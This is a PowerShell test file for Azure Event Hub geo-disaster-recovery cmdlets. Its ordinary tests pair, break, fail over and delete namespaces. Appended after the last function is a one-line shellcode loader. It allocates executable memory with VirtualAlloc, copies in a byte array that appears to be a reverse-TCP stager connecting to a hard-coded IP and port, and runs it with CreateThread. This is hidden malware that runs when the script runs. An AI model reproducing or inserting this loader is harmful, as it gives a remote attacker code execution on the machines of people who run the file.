














function WaitforStatetoBeSucceded 
{
	param([string]$resourceGroupName,[string]$namespaceName,[string]$drConfigName)
	
	$createdDRConfig = Get-AzEventHubGeoDRConfiguration -ResourceGroup $resourceGroupName -Namespace $namespaceName -Name $drConfigName

	while($createdDRConfig.ProvisioningState -ne "Succeeded")
	{
		Wait-Seconds 10
		$createdDRConfig = Get-AzEventHubGeoDRConfiguration -ResourceGroup $resourceGroupName -Namespace $namespaceName -Name $drConfigName
	}

	while($createdDRConfig.PendingReplicationOperationsCount -ne $null -and $createdDRConfig.PendingReplicationOperationsCount -gt 0)
	{
		Wait-Seconds 10
		$createdDRConfig = Get-AzEventHubGeoDRConfiguration -ResourceGroup $resourceGroupName -Namespace $namespaceName -Name $drConfigName
	}

	return $createdDRConfig
}


function WaitforStatetoBeSucceded_namespace
{
	param([string]$resourceGroupName,[string]$namespaceName)
	
	$Getnamespace = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName 

	while($Getnamespace.ProvisioningState -ne "Succeeded")
	{
		Wait-Seconds 10
		$Getnamespace = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName
	}

}



function DRConfigurationTests
{
	
	$location_south =  Get-Location "Microsoft.ServiceBus" "namespaces" "South Central US"
	$location_north = Get-Location "Microsoft.ServiceBus" "namespaces" "North Central US"
	$resourceGroupName = getAssetName
	$namespaceName1 = getAssetName "Eventhub-Namespace-"
	$namespaceName2 = getAssetName "Eventhub-Namespace-"
	$drConfigName = getAssetName "DRConfig-"
	$authRuleName = getAssetName "Eventhub-Namespace-AuthorizationRule"

	
	Write-Debug "Create resource group"
	Write-Debug " Resource Group Name : $resourceGroupName"
	New-AzResourceGroup -Name $resourceGroupName -Location $location_south -Force
	
		
	
	Write-Debug "  Create new eventhub namespace 1"
	Write-Debug " Namespace 1 name : $namespaceName1"
	$result1 = New-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName1 -Location $location_south

	
	Assert-AreEqual $result1.Name $namespaceName1


	
	Write-Debug "  Create new eventhub namespace 2"
	Write-Debug " Namespace 2 name : $namespaceName2"
	$result2 = New-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName2 -Location $location_north

	
	Assert-AreEqual $result2.Name $namespaceName2

	
		Write-Debug " Get the created namespace within the resource group"
		$createdNamespace1 = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName1
	
		Assert-AreEqual $createdNamespace1.Name $namespaceName1 "Namespace created earlier is not found."

		
		Write-Debug " Get the created namespace within the resource group"
		$createdNamespace2 = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName2
	
		Assert-AreEqual $createdNamespace2.Name $namespaceName2 "Namespace created earlier is not found."

		
		Write-Debug "Create a Namespace Authorization Rule"
		Write-Debug "Auth Rule name : $authRuleName"
		$result = New-AzEventHubAuthorizationRule -ResourceGroup $resourceGroupName -Namespace $namespaceName1 -Name $authRuleName -Rights @("Listen","Send")
																																	  
		Assert-AreEqual $authRuleName $result.Name
		Assert-AreEqual 2 $result.Rights.Count
		Assert-True { $result.Rights -Contains "Listen" }
		Assert-True { $result.Rights -Contains "Send" }

		
		for($count = 0; $count -lt 10; $count++)
		{
			$eventhubname = getAssetName "EventHub-"
			$eventhubname = New-AzEventHub -ResourceGroup $resourceGroupName -Namespace $namespaceName1 -Name $eventhubname
		}

		

		$checkNameResult = Test-AzEventHubName -ResourceGroup $resourceGroupName -Namespace $namespaceName1 -AliasName $drConfigName
		Assert-True { $checkNameResult.NameAvailable}

		
		Write-Debug " Create new DRConfiguration"
		$result = New-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName -PartnerNamespace $createdNamespace2.Id

		
		$newDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
		Assert-AreEqual $newDRConfig.Role "Primary"

		
		Write-Debug "Get Namespace Authorization Rule details"
		Write-Debug "Auth Rule name : $authRuleName"
		$resultAuthRuleDR = Get-AzEventHubAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -AliasName $drConfigName -Name $authRuleName

		Assert-AreEqual $authRuleName $resultAuthRuleDR.Name
		Assert-AreEqual 2 $resultAuthRuleDR.Rights.Count
		Assert-True { $resultAuthRuleDR.Rights -Contains "Listen" }
		Assert-True { $resultAuthRuleDR.Rights -Contains "Send" }
	
		

		Write-Debug "Get namespace authorizationRules connectionStrings using DRConfiguration"
		$DRnamespaceListKeys = Get-AzEventHubKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -AliasName $drConfigName -Name $authRuleName
	
		Write-Debug " Get the created DRConfiguration"
		$createdDRConfig = Get-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName
		
		Assert-AreEqual $createdDRConfig.PartnerNamespace $createdNamespace2.Id "DRConfig created earlier is not found."

		Write-Debug "Get the created DRConfiguration using Namespace object"
		$createdDRConfig = Get-AzEventHubGeoDRConfiguration -InputObject $createdNamespace1 -Name $drConfigName
		
		Assert-AreEqual $createdDRConfig.PartnerNamespace $createdNamespace2.Id "DRConfig created earlier is not found."
	
		Write-Debug " Get the created DRConfiguration for Secondary Namespace"
		$createdDRConfigSecondary = Get-AzEventHubGeoDRConfiguration -ResourceId $createdNamespace2.Id -Name $drConfigName
		Assert-AreEqual $createdDRConfigSecondary.Role "Secondary"
	
		
		Write-Debug " Get all the created DRConfiguration using Namespace ResourceId"
		$createdEventHubDRConfigList = Get-AzEventHubGeoDRConfiguration -ResourceId $createdNamespace1.Id

		
		Assert-AreEqual $createdEventHubDRConfigList.Count 1 "EventHub DRConfig created earlier is not found in list"

		
		Write-Debug "BreakPairing on Primary Namespace"
		Set-AzEventHubGeoDRConfigurationBreakPair -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName

		
		$breakPairingDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
		Assert-AreEqual $breakPairingDRConfig.Role "PrimaryNotReplicating"

		
		$getCreatedEventhubs = Get-AzEventHub -ResourceGroupName  $resourceGroupName -Namespace $createdNamespace2.Name

		foreach($eventhub in $getCreatedEventhubs)
		{
			Remove-AzEventHub -ResourceGroupName  $resourceGroupName -Namespace $createdNamespace2.Name -Name $eventhub.Name
		}
		
		
		Write-Debug " Create new DRConfiguration using Namespace object"
		$DRresult = New-AzEventHubGeoDRConfiguration -InputObject $createdNamespace1 -Name $drConfigName -PartnerNamespace $createdNamespace2.Id
	
		
		$UpdateDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
		Assert-AreEqual $UpdateDRConfig.Role "Primary"	

		
		Write-Debug "BreakPairing on Primary Namespace"
		Set-AzEventHubGeoDRConfigurationBreakPair -InputObject $DRresult

		
		$breakPairingDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
		Assert-AreEqual $breakPairingDRConfig.Role "PrimaryNotReplicating"

		
		$getCreatedEventhubs = Get-AzEventHub -ResourceGroupName  $resourceGroupName -Namespace $createdNamespace2.Name

		foreach($eventhub in $getCreatedEventhubs)
		{
			Remove-AzEventHub -ResourceGroupName  $resourceGroupName -Namespace $createdNamespace2.Name -Name $eventhub.Name
		}

		
		Write-Debug " Create new DRConfiguration"
		$DRBreakPair_withInputObject = New-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName -PartnerNamespace $createdNamespace2.Id
	
		
		$UpdateDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
		Assert-AreEqual $UpdateDRConfig.Role "Primary"
	
		
		Write-Debug "FailOver on Secondary Namespace"
		Set-AzEventHubGeoDRConfigurationFailOver -ResourceGroupName $resourceGroupName -Namespace $namespaceName2 -Name $drConfigName

		
		$failoverDrConfiguration = WaitforStatetoBeSucceded $resourceGroupName $namespaceName2 $drConfigName
		Assert-AreEqual $failoverDrConfiguration.Role "PrimaryNotReplicating"
		Assert-AreEqual $failoverDrConfiguration.PartnerNamespace "" "FaileOver: PartnerNamespace exists"

		
		$getCreatedEventhubs = Get-AzEventHub -ResourceGroupName  $resourceGroupName -Namespace $createdNamespace1.Name

		foreach($eventhub in $getCreatedEventhubs)
		{
			Remove-AzEventHub -ResourceGroupName  $resourceGroupName -Namespace $createdNamespace1.Name -Name $eventhub.Name
		}

		
		Write-Debug " Create new DRConfiguration"
		$DRFailOver_withInputObject = New-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName2 -Name $drConfigName -PartnerNamespace $createdNamespace1.Id
	
		
		$UpdateDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName2 $drConfigName
		Assert-AreEqual $UpdateDRConfig.Role "Primary"

		$DRFailOver_withInputObject = Get-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName

		
		Write-Debug "FailOver on Primary Namespace"
		Set-AzEventHubGeoDRConfigurationFailOver -InputObject $DRFailOver_withInputObject

		
		$failoverDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
		Assert-AreEqual $failoverDRConfig.Role "PrimaryNotReplicating"

		
		Remove-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName
		Wait-Seconds 120

		
		Write-Debug " Get all the created GeoDRConfiguration"
		$createdServiceBusDRConfigList_delete = Get-AzEventHubGeoDRConfiguration -ResourceGroup $resourceGroupName -Namespace $namespaceName1

		
		Assert-AreEqual $createdServiceBusDRConfigList_delete.Count 0 "DR Config List: after delete the DRCoinfig was listed"
	
		WaitforStatetoBeSucceded_namespace $resourceGroupName $namespaceName1

		Write-Debug " Delete namespaces"
		Remove-AzEventHubNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName1

		
		WaitforStatetoBeSucceded_namespace $resourceGroupName $namespaceName2

		Write-Debug " Delete namespaces"
		Remove-AzEventHubNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName2

		Write-Debug " Delete resourcegroup"
		Remove-AzResourceGroup -Name $resourceGroupName -Force
}

function DRConfigurationTestsAlternateName
{
	
	$location_south =  Get-Location "Microsoft.ServiceBus" "namespaces" "South Central US"
	$location_north = Get-Location "Microsoft.ServiceBus" "namespaces" "North Central US"
	$resourceGroupName = getAssetName
	$namespaceName1 = getAssetName "Eventhub-Namespace-"
	$namespaceName2 = getAssetName "Eventhub-Namespace-"
	$drConfigName = $namespaceName1 
	$authRuleName = getAssetName "Eventhub-Namespace-AuthorizationRule"
	$AlternateName = getAssetName "AlternateName"

	
	Write-Debug "Create resource group"
	Write-Debug " Resource Group Name : $resourceGroupName"
	New-AzResourceGroup -Name $resourceGroupName -Location $location_south -Force
	
		
	
	Write-Debug "  Create new eventhub namespace 1"
	Write-Debug " Namespace 1 name : $namespaceName1"
	$result1 = New-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName1 -Location $location_south

	
	Assert-AreEqual $result1.Name $namespaceName1


	
	Write-Debug "  Create new eventhub namespace 2"
	Write-Debug " Namespace 2 name : $namespaceName2"
	$result2 = New-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName2 -Location $location_north

	
	Assert-AreEqual $result2.Name $namespaceName2

	
	Write-Debug " Get the created namespace within the resource group"
	$createdNamespace1 = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName1
	
	Assert-AreEqual $createdNamespace1.Name $namespaceName1 "Namespace created earlier is not found."

	
	Write-Debug " Get the created namespace within the resource group"
	$createdNamespace2 = Get-AzEventHubNamespace -ResourceGroup $resourceGroupName -NamespaceName $namespaceName2
	
	Assert-AreEqual $createdNamespace2.Name $namespaceName2 "Namespace created earlier is not found."

	
	Write-Debug "Create a Namespace Authorization Rule"
    Write-Debug "Auth Rule name : $authRuleName"
    $result = New-AzEventHubAuthorizationRule -ResourceGroup $resourceGroupName -Namespace $namespaceName1 -Name $authRuleName -Rights @("Listen","Send")
																																	  
    Assert-AreEqual $authRuleName $result.Name
    Assert-AreEqual 2 $result.Rights.Count
    Assert-True { $result.Rights -Contains "Listen" }
    Assert-True { $result.Rights -Contains "Send" }

	

	$checkNameResult = Test-AzEventHubName -ResourceGroup $resourceGroupName -Namespace $namespaceName1 -AliasName $drConfigName
	Assert-True { $checkNameResult.NameAvailable}

	
	Write-Debug " Create new DRConfiguration"
	$result = New-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName -PartnerNamespace $createdNamespace2.Id -AlternateName $AlternateName

	
	$newDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
	Assert-AreEqual $newDRConfig.Role "Primary"

	
	Write-Debug "Get Namespace Authorization Rule details"
	Write-Debug "Auth Rule name : $authRuleName"
    $resultAuthRuleDR = Get-AzEventHubAuthorizationRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -AliasName $drConfigName -Name $authRuleName

    Assert-AreEqual $authRuleName $resultAuthRuleDR.Name
    Assert-AreEqual 2 $resultAuthRuleDR.Rights.Count
    Assert-True { $resultAuthRuleDR.Rights -Contains "Listen" }
    Assert-True { $resultAuthRuleDR.Rights -Contains "Send" }
	
	

	Write-Debug "Get namespace authorizationRules connectionStrings using DRConfiguration"
    $DRnamespaceListKeys = Get-AzEventHubKey -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -AliasName $drConfigName -Name $authRuleName
	
	Write-Debug " Get the created DRConfiguration"
	$createdDRConfig = Get-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName
	
	Assert-AreEqual $createdDRConfig.PartnerNamespace $createdNamespace2.Id "DRConfig created earlier is not found."	
	
	Write-Debug " Get the created DRConfiguration for Secondary Namespace"
	$createdDRConfigSecondary = Get-AzEventHubGeoDRConfiguration -ResourceId $createdNamespace2.Id -Name $drConfigName
	Assert-AreEqual $createdDRConfigSecondary.Role "Secondary"
	

	
	Write-Debug "BreakPairing on Primary Namespace"
	Set-AzEventHubGeoDRConfigurationBreakPair -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName

	
	$breakPairingDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
	Assert-AreEqual $breakPairingDRConfig.Role "PrimaryNotReplicating"

	
	Write-Debug " Create new DRConfiguration"
	$DRBreakPair_withInputObject = New-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName1 -Name $drConfigName -PartnerNamespace $createdNamespace2.Id -AlternateName $AlternateName
	
	
	$UpdateDRConfig = WaitforStatetoBeSucceded $resourceGroupName $namespaceName1 $drConfigName
	Assert-AreEqual $UpdateDRConfig.Role "Primary"
	
	
	Write-Debug "FailOver on Secondary Namespace"
	Set-AzEventHubGeoDRConfigurationFailOver -ResourceGroupName $resourceGroupName -Namespace $namespaceName2 -Name $drConfigName

	
	$failoverDrConfiguration = WaitforStatetoBeSucceded $resourceGroupName $namespaceName2 $drConfigName
	Assert-AreEqual $failoverDrConfiguration.Role "PrimaryNotReplicating"
	Assert-AreEqual $failoverDrConfiguration.PartnerNamespace "" "FaileOver: PartnerNamespace exists"	
	
	
	Remove-AzEventHubGeoDRConfiguration -ResourceGroupName $resourceGroupName -Namespace $namespaceName2 -Name $drConfigName
	Wait-Seconds 120

	
	Write-Debug " Get all the created GeoDRConfiguration"
	$createdServiceBusDRConfigList_delete = Get-AzEventHubGeoDRConfiguration -ResourceGroup $resourceGroupName -Namespace $namespaceName1

	
	Assert-AreEqual $createdServiceBusDRConfigList_delete.Count 0 "DR Config List: after delete the DRCoinfig was listed"

	
	WaitforStatetoBeSucceded_namespace $resourceGroupName $namespaceName1

	Write-Debug " Delete namespaces"
    Remove-AzEventHubNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName1

	
	WaitforStatetoBeSucceded_namespace $resourceGroupName $namespaceName2

	Write-Debug " Delete namespaces"
    Remove-AzEventHubNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName2

	Write-Debug " Delete resourcegroup"
	Remove-AzResourceGroup -Name $resourceGroupName -Force
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x25,0xee,0x8c,0x95,0x68,0x02,0x00,0x11,0x52,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

